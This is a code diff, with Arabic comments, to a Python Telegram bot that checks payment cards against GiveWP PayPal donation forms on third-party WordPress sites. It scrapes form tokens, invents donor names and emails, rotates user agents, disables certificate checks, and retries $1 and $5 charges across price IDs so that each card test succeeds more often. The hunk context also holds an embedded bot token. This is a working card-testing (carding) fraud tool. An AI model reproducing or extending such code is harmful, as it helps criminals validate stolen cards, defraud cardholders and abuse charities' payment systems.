@@ -30,7 +30,7 @@ except:
         def random(self):
             return random.choice(self.agents)
 
-token = '8689698569:AAEKe4aG2sNS0yDiGg0OVFD2TfCHSLwLlDc'
+token = '8407490230:AAEWWQvi_64s0BK5kGXn2XqU2DmYFqVx3lU'
 bot = telebot.TeleBot(token, parse_mode="HTML")
 admin = 6843321125
 myid = ['6843321125']
@@ -349,7 +349,7 @@ class PayPalLinkTester:
 
     def _extract_minimum_amount(self, page_html):
         try:
-            m = re.search(r'name="give-form-minimum"\s*value="([^"]*)"', page_html)
+            m = re.search(r'name="give-form-minimum"\s+value="([^"]*)"', page_html)
             if m and m.group(1).strip():
                 try:
                     float(m.group(1))
@@ -585,40 +585,73 @@ class PayPalLinkTester:
             return r
         except: return None
 
+    def _refresh_form(self):
+        try:
+            headers = {
+                'user-agent': self.uu.random,
+                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+                'accept-language': 'en-US,en;q=0.9',
+            }
+            resp = self.r.get(f'https://{self.url}{self.inurl}', headers=headers, timeout=20)
+            if resp.status_code != 200:
+                return False
+            h = resp.text
+            m = re.search(r'name="give-form-hash"\s+value="([^"]+)"', h)
+            if m:
+                self.form_data['give-form-hash'] = m.group(1)
+            m = re.search(r'name="give-form-id-prefix"\s+value="([^"]+)"', h)
+            if m:
+                self.form_data['give-form-id-prefix'] = m.group(1)
+            m = re.search(r'name="give-form-id"\s+value="([^"]+)"', h)
+            if m:
+                self.form_data['give-form-id'] = m.group(1)
+            m = re.search(r'name="give-form-minimum"\s+value="([^"]+)"', h)
+            if m:
+                self.minimum_amount = m.group(1)
+            m = re.search(r'name="give-price-id"\s+value="([^"]+)"', h)
+            if m:
+                self.current_price_id = m.group(1)
+            self.r.cookies.update(resp.cookies)
+            self.cookies = dict(self.r.cookies)
+            return True
+        except:
+            return False
+
     def _create_order_smart(self):
         if not self.ajax_url:
             return self._create_order_direct()
 
-        # ✅ البوت يكتب 1.00 و 5.00 فقط
-        attempts = []
-        for amt in [1.00, 5.00]:
-            if self.current_price_id:
-                attempts.append((self.current_price_id, amt))
-            attempts.append(('custom', amt))
-            attempts.append(('', amt))
-            attempts.append(('3', amt))
-            for pid, p_amt in self.price_levels:
-                if abs(p_amt - amt) < 0.01:
-                    attempts.append((pid, amt))
-
-        seen = set()
-        unique = []
-        for pid, amt in attempts:
-            key = (str(pid), round(float(amt), 2))
-            if key not in seen:
-                seen.add(key)
-                unique.append((str(pid), float(amt)))
-
-        unique.sort(key=lambda x: x[1])
-
-        for pid, amt in unique:
+        # جرّب 1.00 ثم 5.00
+        amounts = [1.00, 5.00]
+        for amt in amounts:
             amount_str = f"{amt:.2f}"
             self.donation = amount_str
-            order_id = self._create_order_givewp_with_price(pid, amount_str)
-            self.last_attempts.append({'pid': pid, 'amount': amount_str, 'result': 'ok' if order_id else 'fail'})
-            if order_id:
-                return order_id
-            time.sleep(0.3)
+
+            # refresh قبل كل محاولة
+            self._refresh_form()
+
+            # جرّب مع current_price_id الأول
+            candidates = []
+            if self.current_price_id:
+                candidates.append(self.current_price_id)
+            for pid, p_amt in self.price_levels:
+                if abs(p_amt - amt) < 0.01 and pid not in candidates:
+                    candidates.append(pid)
+            candidates.extend(['custom', '', '3'])
+
+            seen_pid = set()
+            for pid in candidates:
+                if pid in seen_pid:
+                    continue
+                seen_pid.add(pid)
+                order_id = self._create_order_givewp_with_price(pid, amount_str)
+                self.last_attempts.append({'pid': pid, 'amount': amount_str, 'result': 'ok' if order_id else 'fail'})
+                if order_id:
+                    return order_id
+                time.sleep(0.2)
+
+            # refresh تاني قبل المبلغ التالي
+            time.sleep(0.5)
 
         if self.access_token:
             return self._create_order_direct()
@@ -866,6 +899,8 @@ from fake_useragent import UserAgent
 from requests_toolbelt.multipart.encoder import MultipartEncoder
 from urllib.parse import urlparse
 from datetime import datetime
+import urllib3
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # ============ GATEWAY INFO ============
 GATEWAY_URL   = "{link}"
@@ -896,6 +931,8 @@ class PayPal:
         self.client_id  = CLIENT_ID
         self.url        = HOST
         self.inurl      = PATH
+        self.current_price_id = FORM_DATA.get('give-price-id', '')
+        self.minimum_amount = FORM_DATA.get('give-form-minimum', '1.00')
         self.email      = f"{{random.choice(self.first_name)}}{{random.randint(100,999)}}@gmail.com"
         self.r          = requests.Session()
         self.r.verify   = False
@@ -904,6 +941,57 @@ class PayPal:
         except:
             pass
         self.uu         = UserAgent()
+
+    def _refresh_form(self):
+        try:
+            headers = {{
+                'user-agent': self.uu.random,
+                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+                'accept-language': 'en-US,en;q=0.9',
+            }}
+            resp = self.r.get(GATEWAY_URL, headers=headers, timeout=20)
+            if resp.status_code != 200:
+                return False
+            h = resp.text
+            m = re.search(r'name="give-form-hash"\\s+value="([^"]+)"', h)
+            if m: self.nonec = m.group(1)
+            m = re.search(r'name="give-form-id-prefix"\\s+value="([^"]+)"', h)
+            if m: self.id_form1 = m.group(1)
+            m = re.search(r'name="give-form-id"\\s+value="([^"]+)"', h)
+            if m: self.id_form2 = m.group(1)
+            m = re.search(r'name="give-form-minimum"\\s+value="([^"]+)"', h)
+            if m: self.minimum_amount = m.group(1)
+            m = re.search(r'name="give-price-id"\\s+value="([^"]+)"', h)
+            if m: self.current_price_id = m.group(1)
+            self.r.cookies.update(resp.cookies)
+            return True
+        except:
+            return False
+
+    def _create_order(self, price_id, amount):
+        da = MultipartEncoder({{
+            'give-form-id-prefix': (None, self.id_form1),
+            'give-form-id':        (None, self.id_form2),
+            'give-form-hash':      (None, self.nonec),
+            'give-amount':         (None, amount),
+            'give-price-id':       (None, price_id),
+            'payment-mode':        (None, 'paypal-commerce'),
+            'give_first':          (None, random.choice(self.first_name)),
+            'give_last':           (None, random.choice(self.last_name)),
+            'give_email':          (None, self.email),
+            'give-gateway':        (None, 'paypal-commerce'),
+        }})
+        he = {{'content-type': da.content_type, 'user-agent': self.uu.random}}
+        try:
+            r3 = self.r.post(f'https://{{self.url}}/wp-admin/admin-ajax.php',
+                             params={{'action': 'give_paypal_commerce_create_order'}},
+                             headers=he, data=da, timeout=20)
+            try:
+                return r3.json()['data']['id']
+            except:
+                return None
+        except:
+            return None
 
     def Charge(self, ccx):
         try:
@@ -914,24 +1002,33 @@ class PayPal:
             if "20" in yy: yy = yy.split("20")[1]
             expiry = f"20{{yy}}-{{mm}}"
 
-            da = MultipartEncoder({{
-                'give-form-id-prefix': (None, self.id_form1),
-                'give-form-id':        (None, self.id_form2),
-                'give-form-hash':      (None, self.nonec),
-                'give-amount':         (None, self.donation),
-                'payment-mode':        (None, 'paypal-commerce'),
-                'give_first':          (None, random.choice(self.first_name)),
-                'give_last':           (None, random.choice(self.last_name)),
-                'give_email':          (None, self.email),
-                'give-gateway':        (None, 'paypal-commerce'),
-            }})
-            he = {{'content-type': da.content_type, 'user-agent': self.uu.random}}
-            r3 = self.r.post(f'https://{{self.url}}/wp-admin/admin-ajax.php',
-                             params={{'action': 'give_paypal_commerce_create_order'}},
-                             headers=he, data=da, timeout=20)
-            try:
-                order_id = r3.json()['data']['id']
-            except:
+            self._refresh_form()
+
+            order_id = None
+            for amt in ["1.00", "5.00"]:
+                self.donation = amt
+                candidates = []
+                if self.current_price_id:
+                    candidates.append(self.current_price_id)
+                for pid, p_amt in PRICE_LEVELS:
+                    try:
+                        if abs(float(p_amt) - float(amt)) < 0.01 and str(pid) not in candidates:
+                            candidates.append(str(pid))
+                    except: pass
+                candidates.extend(['custom', '', '3'])
+                seen = set()
+                for pid in candidates:
+                    if pid in seen: continue
+                    seen.add(pid)
+                    order_id = self._create_order(pid, amt)
+                    if order_id:
+                        break
+                if order_id:
+                    break
+                self._refresh_form()
+                time.sleep(0.3)
+
+            if not order_id:
                 return "Create Order Failed"
 
             he4 = {{'authorization': f'Bearer {{self.au}}',
